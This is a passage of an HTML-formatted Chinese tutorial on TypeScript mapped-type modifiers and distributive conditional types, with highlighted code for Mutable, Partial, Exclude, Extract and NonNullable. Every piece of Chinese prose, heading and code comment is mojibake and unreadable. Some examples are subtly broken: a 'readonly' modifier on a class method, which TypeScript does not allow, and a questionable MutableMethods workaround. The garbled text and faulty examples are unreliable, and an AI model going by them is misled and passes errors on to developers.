class="hljs-keyword">interface</span> <span class="hljs-title class_">AppState</span> &#123;<br>  <span class="hljs-attr">user</span>: &#123; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> &#125;;<br>  <span class="hljs-attr">settings</span>: &#123; <span class="hljs-attr">darkMode</span>: <span class="hljs-built_in">boolean</span> &#125;;<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-attr">state</span>: <span class="hljs-title class_">ImmutableState</span>&lt;<span class="hljs-title class_">AppState</span>&gt; = &#123;<br>  <span class="hljs-attr">user</span>: &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span> &#125;,<br>  <span class="hljs-attr">settings</span>: &#123; <span class="hljs-attr">darkMode</span>: <span class="hljs-literal">true</span> &#125;<br>&#125;;<br>state.<span class="hljs-property">user</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Bob&quot;</span>; <span class="hljs-comment">// ğŸš« ç¼–è¯‘é”™è¯¯</span><br></code></pre></td></tr></table></figure><ol start="2"><li>API å“åº”å¤„ç†ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç§»é™¤APIå“åº”ä¸­çš„å¯é€‰å±æ€§</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ConcreteResponse</span>&lt;T&gt; = &#123;<br>  [P <span class="hljs-keyword">in</span> keyof T]-?: T[P];<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ApiResponse</span> &#123;<br>  <span class="hljs-attr">data</span>?: <span class="hljs-built_in">unknown</span>;<br>  <span class="hljs-attr">error</span>?: <span class="hljs-built_in">string</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params"><span class="hljs-attr">res</span>: <span class="hljs-title class_">ConcreteResponse</span>&lt;<span class="hljs-title class_">ApiResponse</span>&gt;</span>) &#123;<br>  <span class="hljs-comment">// res.data å’Œ res.error ä¸€å®šå­˜åœ¨</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>å®‰å…¨è¡¥ä¸ç­–ç•¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åˆ›å»ºéƒ¨åˆ†æ›´æ–°ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">SafePatch</span>&lt;T&gt; = <span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">Mutable</span>&lt;T&gt;&gt; &amp; &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// ä¿æŒIDåªè¯»</span><br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Product</span> &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">price</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-attr">update</span>: <span class="hljs-title class_">SafePatch</span>&lt;<span class="hljs-title class_">Product</span>&gt; = &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-string">&quot;p1&quot;</span>, <span class="hljs-comment">// âœ… å…è®¸ï¼ˆä½†å®é™…ä¸èƒ½ä¿®æ”¹ï¼‰</span><br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;New Name&quot;</span> <span class="hljs-comment">// âœ…</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</strong></p><ol><li>é¿å…æ·±åº¦é€’å½’ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// é™åˆ¶é€’å½’æ·±åº¦</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">DeepReadonly</span>&lt;T, <span class="hljs-title class_">Depth</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">number</span> = <span class="hljs-number">3</span>&gt; = <br>  <span class="hljs-title class_">Depth</span> <span class="hljs-keyword">extends</span> <span class="hljs-number">0</span> ? T : <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span> ? &#123;<br>    <span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: <span class="hljs-title class_">DeepReadonly</span>&lt;T[P], [-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>][<span class="hljs-title class_">Depth</span>]&gt;;<br>  &#125; : T;<br></code></pre></td></tr></table></figure><ol start="2"><li>æ¡ä»¶çŸ­è·¯ä¼˜åŒ–ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">OptimizedMutable</span>&lt;T&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">any</span>[] ? <span class="hljs-title class_">Array</span>&lt;<span class="hljs-title class_">OptimizedMutable</span>&lt;T[<span class="hljs-built_in">number</span>]&gt;&gt; :<br>  T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span> ? &#123; -<span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: <span class="hljs-title class_">OptimizedMutable</span>&lt;T[P]&gt; &#125; :<br>  T;<br></code></pre></td></tr></table></figure><p><strong>ç¼–è¯‘åŸç†é€è§†</strong></p><ol><li>ä¿®é¥°ç¬¦çš„ AST è¡¨ç¤ºï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// TypeScript AST èŠ‚ç‚¹ç¤ºä¾‹</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MappingModifier</span> &#123;<br>  +?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// æ·»åŠ ä¿®é¥°ç¬¦</span><br>  -?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// ç§»é™¤ä¿®é¥°ç¬¦</span><br>  <span class="hljs-attr">readonly</span>?: <span class="hljs-string">&quot;+&quot;</span> | <span class="hljs-string">&quot;-&quot;</span> | <span class="hljs-literal">null</span>;<br>  <span class="hljs-attr">optional</span>?: <span class="hljs-string">&quot;+&quot;</span> | <span class="hljs-string">&quot;-&quot;</span> | <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>ç±»å‹å®ä¾‹åŒ–æµç¨‹ï¼š</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">1. è§£ææ˜ å°„è¯­æ³•<br>2. è·å–æºç±»å‹å±æ€§æè¿°ç¬¦<br>3. åº”ç”¨ä¿®é¥°ç¬¦æ“ä½œï¼ˆ+/-ï¼‰<br>4. åˆ›å»ºæ–°å±æ€§æè¿°ç¬¦<br>5. ç»„åˆä¸ºæ–°å¯¹è±¡ç±»å‹<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>é—®é¢˜ï¼šä¿®é¥°ç¬¦å¯¹æ–¹æ³•æ— æ•ˆ</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;&#125; <span class="hljs-comment">// æ–¹æ³•æœ¬è´¨æ˜¯åªè¯»çš„</span><br>&#125;<br><span class="hljs-keyword">type</span> T = <span class="hljs-title class_">Mutable</span>&lt;<span class="hljs-title class_">Test</span>&gt;; <span class="hljs-comment">// ä»ç„¶åªè¯»</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MutableMethods</span>&lt;T&gt; = &#123;<br>  -<span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: T[P];<br>&#125; &amp; &#123;<br>  [P <span class="hljs-keyword">in</span> keyof T]: T[P] <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Function</span> ? <span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> <span class="hljs-built_in">any</span> : T[P];<br>&#125;;<br></code></pre></td></tr></table></figure><p>é—®é¢˜ï¼šä¿®é¥°ç¬¦ä¸äº¤å‰ç±»å‹å†²çª</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> A = &#123; <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span> &#125;;<br><span class="hljs-keyword">type</span> B = &#123; <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span> &#125;;<br><span class="hljs-keyword">type</span> C = A &amp; B; <span class="hljs-comment">// id å˜ä¸º stringï¼ˆåªè¯»è¢«è¦†ç›–ï¼‰</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">EnforceReadonly</span>&lt;T&gt; = &#123;<br>  <span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: T[P];<br>&#125;;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">SafeMerge</span>&lt;A, B&gt; = <span class="hljs-title class_">EnforceReadonly</span>&lt;A&gt; &amp; <span class="hljs-title class_">EnforceReadonly</span>&lt;B&gt;;<br></code></pre></td></tr></table></figure><p>é—®é¢˜ï¼šæ•°ç»„å’Œå…ƒç»„å¤„ç†</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å…ƒç»„å¯å˜åŒ–</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">MutableTuple</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">any</span>[]&gt; = &#123;<br>  -<span class="hljs-keyword">readonly</span> [K <span class="hljs-keyword">in</span> keyof T]: T[K];<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">arr</span>: <span class="hljs-title class_">MutableTuple</span>&lt;<span class="hljs-keyword">readonly</span> [<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>]&gt; = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">1</span>];<br>arr[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;b&quot;</span>; <span class="hljs-comment">// âœ…</span><br></code></pre></td></tr></table></figure><p><strong>ä¿®é¥°ç¬¦ä¸å†…ç½®å·¥å…·ç±»å‹å…³ç³»</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">æ˜ å°„ä¿®é¥°ç¬¦ä½“ç³»<br>â”œâ”€ æ·»åŠ æ“ä½œ (+)<br>â”‚  â”œâ”€ +readonly â†’ Readonly&lt;T&gt;<br>â”‚  â””â”€ +? â†’ Partial&lt;T&gt;<br>â”‚<br>â””â”€ ç§»é™¤æ“ä½œ (-)<br>   â”œâ”€ -readonly â†’ Mutable&lt;T&gt;<br>   â””â”€ -? â†’ Required&lt;T&gt;<br></code></pre></td></tr></table></figure><h3 id="2-1-3-æ¡ä»¶ç±»å‹åˆ†å¸ƒå¼ç‰¹æ€§"><a href="#2-1-3-æ¡ä»¶ç±»å‹åˆ†å¸ƒå¼ç‰¹æ€§" class="headerlink" title="2.1.3 æ¡ä»¶ç±»å‹åˆ†å¸ƒå¼ç‰¹æ€§"></a>2.1.3 æ¡ä»¶ç±»å‹åˆ†å¸ƒå¼ç‰¹æ€§</h3><p><strong>åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹æ ¸å¿ƒæ¦‚å¿µ</strong></p><p>è§¦å‘æ¡ä»¶ï¼šå½“æ¡ä»¶ç±»å‹ä½œç”¨äºè£¸ç±»å‹å‚æ•°ï¼ˆnaked type parameterï¼‰çš„è”åˆç±»å‹æ—¶ï¼Œä¼šè§¦å‘åˆ†å¸ƒå¼è¡Œä¸º</p><p>åŸºæœ¬æ¨¡å¼ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript">T <span class="hljs-keyword">extends</span> U ? X : Y<br></code></pre></td></tr></table></figure><ul><li>T æ˜¯è£¸ç±»å‹å‚æ•°ï¼ˆæœªåŒ…è£¹åœ¨æ•°ç»„ã€å…ƒç»„æˆ–å‡½æ•°ä¸­ï¼‰</li><li>T æ˜¯è”åˆç±»å‹ A | B | C</li><li>ç»“æœç­‰ä»·äº (A extends U ? X : Y) | (B extends U ? X : Y) | (C extends U ? X : Y)</li></ul><p><strong>åˆ†å¸ƒå¼è¡Œä¸ºè§£æ</strong></p><ol><li>åŸºç¡€ç¤ºä¾‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">StringOrNumber</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-string">&quot;string&quot;</span> : <span class="hljs-string">&quot;number&quot;</span>;<br><br><span class="hljs-comment">// åˆ†å¸ƒå¼è®¡ç®—</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">StringOrNumber</span>&lt;<span class="hljs-string">&quot;a&quot;</span> | <span class="hljs-number">1</span>&gt;; <br><span class="hljs-comment">// ç­‰ä»·äºï¼š</span><br><span class="hljs-comment">// (&quot;a&quot; extends string ? &quot;string&quot; : &quot;number&quot;) |</span><br><span class="hljs-comment">// (1 extends string ? &quot;string&quot; : &quot;number&quot;)</span><br><span class="hljs-comment">// â†’ &quot;string&quot; | &quot;number&quot;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>éåˆ†å¸ƒå¼å¯¹æ¯”ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŒ…è£¹ç±»å‹å‚æ•°ï¼ˆéè£¸ç±»å‹ï¼‰</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Wrapped</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">string</span>] ? <span class="hljs-string">&quot;string&quot;</span> : <span class="hljs-string">&quot;number&quot;</span>;<br><br><span class="hljs-comment">// éåˆ†å¸ƒå¼è®¡ç®—</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result2</span> = <span class="hljs-title class_">Wrapped</span>&lt;<span class="hljs-string">&quot;a&quot;</span> | <span class="hljs-number">1</span>&gt;;<br><span class="hljs-comment">// ç­‰ä»·äºï¼š</span><br><span class="hljs-comment">// [&quot;a&quot; | 1] extends [string] ? &quot;string&quot; : &quot;number&quot;</span><br><span class="hljs-comment">// â†’ &quot;number&quot;ï¼ˆå› ä¸º [&quot;a&quot; | 1] ä¸ç»§æ‰¿ [string]ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†å¸ƒå¼è§„åˆ™è¯¦è§£</strong></p><ol><li>ç©ºè”åˆç±»å‹å¤„ç†ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Test</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">Test</span>&lt;<span class="hljs-built_in">never</span>&gt;; <span class="hljs-comment">// neverï¼ˆç©ºè”åˆç±»å‹è¿”å›neverï¼‰</span><br></code></pre></td></tr></table></figure><ol start="2"><li>è”åˆç±»å‹åŒ…å«neverï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Test</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">Test</span>&lt;<span class="hljs-string">&quot;a&quot;</span> | <span class="hljs-built_in">never</span>&gt;; <span class="hljs-comment">// trueï¼ˆneverè¢«å¿½ç•¥ï¼‰</span><br></code></pre></td></tr></table></figure><ol start="3"><li>è”åˆç±»å‹ä¼˜å…ˆçº§ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Test</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span> ? T : <span class="hljs-built_in">never</span>;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">Test</span>&lt;<span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// string | number</span><br></code></pre></td></tr></table></figure><p><strong>å†…ç½®å·¥å…·ç±»å‹åº”ç”¨</strong></p><ol><li><code>Exclude&lt;T, U&gt;</code>ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Exclude</span>&lt;T, U&gt; = T <span class="hljs-keyword">extends</span> U ? <span class="hljs-built_in">never</span> : T;<br><br><span class="hljs-comment">// åˆ†å¸ƒå¼è®¡ç®—</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">Exclude</span>&lt;<span class="hljs-string">&quot;a&quot;</span> | <span class="hljs-string">&quot;b&quot;</span> | <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;a&quot;</span> | <span class="hljs-string">&quot;b&quot;</span>&gt;;<br><span class="hljs-comment">// â†’ (&quot;a&quot; extends &quot;a&quot;|&quot;b&quot; ? never : &quot;a&quot;) |</span><br><span class="hljs-comment">//   (&quot;b&quot; extends &quot;a&quot;|&quot;b&quot; ? never : &quot;b&quot;) |</span><br><span class="hljs-comment">//   (&quot;c&quot; extends &quot;a&quot;|&quot;b&quot; ? never : &quot;c&quot;)</span><br><span class="hljs-comment">// â†’ never | never | &quot;c&quot; â†’ &quot;c&quot;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>Extract&lt;T, U&gt;</code>ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Extract</span>&lt;T, U&gt; = T <span class="hljs-keyword">extends</span> U ? T : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// åˆ†å¸ƒå¼è®¡ç®—</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">Extract</span>&lt;<span class="hljs-string">&quot;a&quot;</span> | <span class="hljs-string">&quot;b&quot;</span> | <span class="hljs-number">1</span>, <span class="hljs-built_in">string</span>&gt;;<br><span class="hljs-comment">// â†’ (&quot;a&quot; extends string ? &quot;a&quot; : never) |</span><br><span class="hljs-comment">//   (&quot;b&quot; extends string ? &quot;b&quot; : never) |</span><br><span class="hljs-comment">//   (1 extends string ? 1 : never)</span><br><span class="hljs-comment">// â†’ &quot;a&quot; | &quot;b&quot; | never â†’ &quot;a&quot; | &quot;b&quot;</span><br></code></pre></td></tr></table></figure><ol start="3"><li><code>NonNullable&lt;T&gt;</code>ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">NonNullable</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-literal">null</span> | <span class="hljs-literal">undefined</span> ? <span class="hljs-built_in">never</span> : T;<br><br><span class="hljs-comment">// åˆ†å¸ƒå¼è®¡ç®—</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">NonNullable</span>&lt;<span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span> | <span class="hljs-literal">undefined</span>&gt;;<br><span class="hljs-comment">// â†’ (string extends null|undefined ? never : string) |</span><br><span class="hljs-comment">//   (null extends null|undefined ? never : null) |</span><br><span class="hljs-comment">//   (undefined extends null|undefined ? never : undefined)</span><br><span class="hljs-comment">// â†’ string | never | never â†’ string</span><br></code></pre></td></tr></table></figure><p><strong>é¿å…åˆ†å¸ƒå¼è¡Œä¸º</strong></p><ol><li>åŒ…è£¹ç±»å‹å‚æ•°ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ–¹æ³•1ï¼šå…ƒç»„åŒ…è£¹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">NoDistribute</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">string</span>] ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">// æ–¹æ³•2ï¼šæ•°ç»„åŒ…è£¹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">NoDistribute2</span>&lt;T&gt; = T[] <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>[] ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">// æ–¹æ³•3ï¼šå‡½æ•°åŒ…è£¹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">NoDistribute3</span>&lt;T&gt; = (<span class="hljs-function">() =&gt;</span> T) <span class="hljs-title function_">extends</span> () =&gt; <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><ol start="2"><li>ç‰¹æ®Šç±»å‹çº¦æŸï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨neverçº¦æŸ</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">IsNever</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">never</span>] ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨anyçº¦æŸ</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">IsAny</span>&lt;T&gt; = <span class="hljs-number">0</span> <span class="hljs-title function_">extends</span> (<span class="hljs-number">1</span> &amp; T) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§åº”ç”¨åœºæ™¯</strong></p><ol><li>è”åˆç±»å‹è¿‡æ»¤ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è¿‡æ»¤å‡ºå‡½æ•°ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">FilterFunctions</span>&lt;T&gt; = T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; <span class="hljs-built_in">any</span> ? T : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Functions</span> = <span class="hljs-title class_">FilterFunctions</span>&lt;<span class="hljs-built_in">string</span> | (<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>) | <span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// () =&gt; void</span><br></code></pre></td></tr></table></figure><ol start="2"><li>ç±»å‹å·®å¼‚æ£€æµ‹ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ£€æµ‹ç±»å‹å·®å¼‚</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Diff</span>&lt;T, U&gt; = T <span class="hljs-keyword">extends</span> U ? <span class="hljs-built_in">never</span> : T;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">MissingProps</span> = <span class="hljs-title class_">Diff</span>&lt;<span class="hljs-string">&quot;name&quot;</span> | <span class="hljs-string">&quot;age&quot;</span>, keyof <span class="hljs-title class_">User</span>&gt;; <span class="hljs-comment">// Userä¸­ç¼ºå¤±çš„å±æ€§</span><br></code></pre></td></tr></table></figure><ol start="3"><li>é€’å½’ç±»å‹æ“ä½œï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è”åˆç±»å‹è½¬å…ƒç»„ï¼ˆç®€åŒ–ç‰ˆï¼‰</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">UnionToTuple</span>&lt;T&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span> ? <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">arg</span>: T</span>) =&gt;</span> <span 